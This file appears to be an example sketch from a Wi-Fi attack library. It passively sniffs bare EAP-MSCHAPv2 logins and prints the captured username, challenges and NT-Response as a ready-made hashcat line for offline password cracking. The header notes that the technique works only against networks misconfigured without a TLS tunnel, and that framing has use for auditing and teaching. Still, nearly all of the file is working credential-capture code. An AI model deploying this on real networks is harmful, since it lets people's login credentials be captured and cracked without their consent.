/*
 * MsChapCapture.ino
 *
 * Demonstrates passive bare EAP-MSCHAPv2 credential capture using the
 * Politician library.
 *
 * EAP-MSCHAPv2 (RFC 2759) uses a challenge/response exchange:
 *   AP   → Client  : 16-byte server challenge
 *   Client → AP    : NT-Response (24 bytes) derived from NTLM hash + challenge
 *
 * When MSCHAPv2 runs bare (not inside a PEAP/TTLS TLS tunnel), both frames
 * are in plaintext and can be passively sniffed. The NT-Response + challenge
 * pair can be fed directly into hashcat mode 5500 (NetNTLMv1).
 *
 * NOTE: Bare MSCHAPv2 without an outer TLS tunnel is a network misconfiguration
 * (RFC 2759 §9.3 explicitly warns against it). PEAP/TTLS MSCHAPv2 encrypts
 * the inner exchange and is NOT capturable by this method.
 *
 * This example is disabled at compile time if POLITICIAN_NO_MSCHAPV2 is defined.
 *
 * Build flags (platformio.ini):
 *   build_flags = -DPOLITICIAN_NO_MSCHAPV2   ; disables this feature entirely
 */

#include <Arduino.h>
#include <Politician.h>

using namespace politician;

#ifndef POLITICIAN_NO_MSCHAPV2

Politician engine;

// ─── MSCHAPv2 Capture Callback ────────────────────────────────────────────────

void onMsChap(const MsChapRecord &rec) {
    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║    Bare EAP-MSCHAPv2 Pair Captured       ║");
    Serial.println("╚══════════════════════════════════════════╝");

    Serial.printf("  AP BSSID : %02X:%02X:%02X:%02X:%02X:%02X\n",
        rec.bssid[0], rec.bssid[1], rec.bssid[2],
        rec.bssid[3], rec.bssid[4], rec.bssid[5]);

    Serial.printf("  STA MAC  : %02X:%02X:%02X:%02X:%02X:%02X\n",
        rec.sta[0], rec.sta[1], rec.sta[2],
        rec.sta[3], rec.sta[4], rec.sta[5]);

    Serial.printf("  Username : %s\n", rec.username);

    // Server challenge (from AP → Client, 16 bytes)
    Serial.print("  Server Challenge: ");
    for (int i = 0; i < 16; i++) Serial.printf("%02X", rec.server_challenge[i]);
    Serial.println();

    // NT-Response (from Client → AP, 24 bytes)
    Serial.print("  NT-Response     : ");
    for (int i = 0; i < 24; i++) Serial.printf("%02X", rec.nt_response[i]);
    Serial.println();

    // Peer challenge (from Client → AP, 16 bytes)
    Serial.print("  Peer Challenge  : ");
    for (int i = 0; i < 16; i++) Serial.printf("%02X", rec.peer_challenge[i]);
    Serial.println();

    // Print hashcat mode 5500 line for direct cracking
    // Format: username::::peer_challenge:server_challenge:nt_response
    Serial.println("\n  [hashcat -m 5500 format]");
    Serial.printf("  %s::::", rec.username);
    for (int i = 0; i < 16; i++) Serial.printf("%02X", rec.peer_challenge[i]);
    Serial.print(":");
    for (int i = 0; i < 16; i++) Serial.printf("%02X", rec.server_challenge[i]);
    Serial.print(":");
    for (int i = 0; i < 24; i++) Serial.printf("%02X", rec.nt_response[i]);
    Serial.println("\n──────────────────────────────────────────────\n");
}

// ─── EAP Identity Callback (optional: log who's authenticating) ───────────────

void onIdentity(const EapIdentityRecord &rec) {
    Serial.printf("[EAP] Identity: \"%s\" from %02X:%02X:%02X:%02X:%02X:%02X\n",
        rec.identity,
        rec.client[0], rec.client[1], rec.client[2],
        rec.client[3], rec.client[4], rec.client[5]);
}

// ─── Setup ───────────────────────────────────────────────────────────────────

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- Politician: Bare EAP-MSCHAPv2 Capture Example ---");
    Serial.println("Listening for unencapsulated MSCHAPv2 exchanges...\n");
    Serial.println("NOTE: Only captures bare MSCHAPv2 (no PEAP/TTLS tunnel).");
    Serial.println("      Tunneled MSCHAPv2 is encrypted and NOT captured here.\n");

    Config cfg;
    cfg.smart_hopping = true;

    if (engine.begin(cfg) != politician::OK) {
        Serial.println("[ERROR] WiFi init failed!");
        while (1) delay(100);
    }

    engine.setIdentityCallback(onIdentity);
    engine.setMsChapCallback(onMsChap);

    // Passive only — just listen for EAP frames
    engine.setAttackMask(ATTACK_PASSIVE);
    engine.startHopping();

    Serial.println("Hopper started. Listening for MSCHAPv2 exchanges...");
}

// ─── Loop ────────────────────────────────────────────────────────────────────

void loop() {
    engine.tick();
}

#else // POLITICIAN_NO_MSCHAPV2 defined

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("MSCHAPv2 capture is disabled (POLITICIAN_NO_MSCHAPV2 defined).");
    Serial.println("Remove the define from build_flags to enable this feature.");
}

void loop() {}

#endif
